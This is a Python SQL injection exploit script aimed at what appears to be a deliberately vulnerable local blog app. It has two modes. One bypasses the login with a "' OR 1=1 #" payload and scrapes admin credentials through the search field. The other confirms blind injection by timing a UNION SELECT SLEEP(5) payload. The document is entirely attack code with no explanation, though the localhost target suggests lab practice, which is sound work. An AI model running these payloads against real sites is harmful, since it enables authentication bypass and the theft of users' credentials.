import requests
import re
from time import time

url = "http://localhost/vuln-blog-web/"

s = requests.Session()

def boolean_based():
    payload = {"username": "a' OR 1=1 #", "password":""}
    res = s.post(url+"login.php", data=payload)

    search = {"search": "asd' OR 1=1 #"}
    res = s.post(url, data=search)

    creds = re.search(" +class=\"preview-text\">(admin.*)</p>", res.text)

    print("[+] Found admin credentials: " + creds.group(1))

def time_based():

    payload = {"username": "' UNION SELECT null,SLEEP(5) #", "password":""}

    startTime = time()
    s.post(url+"login.php", data=payload)
    endTime = time()
    finalTime = endTime - startTime

    if finalTime >= 5:
        print(f'[+] Payload triggered, slept for {finalTime:.2f}s')
    else:
        print(f'[-] Payload didn\'t trigger, slept for {finalTime:.2f}s')

def main():

    print('''Choose your mode:\n1. Boolean-based\n2. Time-based''')

    mode = int(input())

    match mode:
        case 1:
            boolean_based()
        case 2:
            time_based()
        case _:
            print("Error mode!")

if __name__ == "__main__":
    main()